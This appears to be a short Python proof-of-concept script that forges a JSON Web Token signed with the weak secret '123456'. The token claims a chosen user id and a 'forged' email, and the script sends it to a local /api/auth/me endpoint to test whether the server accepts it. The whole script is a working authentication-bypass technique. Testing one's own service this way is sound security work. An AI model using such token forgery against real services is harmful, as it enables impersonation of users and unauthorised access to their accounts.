


import requests

import jwt

me_url = "http://localhost:8000/api/auth/me"
secret = "123456"

payload = {"id": "1794730576643", 
           "email": "forged@test.com"}


newtoken = jwt.encode(payload,secret, algorithm="HS256")


print(newtoken)

res = requests.get(me_url, headers={"Authorization": "Bearer " + newtoken})


print(res.status_code)
print(res.text)
